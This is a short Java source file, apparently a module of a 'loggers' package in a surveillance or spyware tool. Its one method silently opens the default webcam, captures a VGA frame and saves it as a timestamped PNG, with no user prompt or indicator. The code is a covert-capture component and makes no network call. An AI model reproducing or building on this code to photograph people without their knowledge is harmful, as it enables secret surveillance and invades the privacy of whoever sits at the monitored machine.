package ml.inix.loggers;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamResolution;
import ml.inix.Config;
import ml.inix.util.Color;
import ml.inix.util.Log;

import javax.imageio.ImageIO;
import java.io.File;
import java.io.IOException;
import java.util.Date;

public class Webcamera {

    public static void capture(){
        Webcam webcam = Webcam.getDefault();
        String fileName = "capture_" + new Date().toString().replace(" ", "_").replace(":", "-");
        if (webcam != null) {
            webcam.close();
            webcam.setViewSize(WebcamResolution.VGA.getSize());
            webcam.open();

            try {
                ImageIO.write(webcam.getImage(), "PNG", new File(Config.PATH_WEBCAM + fileName + ".png"));
            }
            catch (IOException e) {
                Log.out(Color.RED + e.getMessage());
            }

            webcam.close();
        }
    }
}
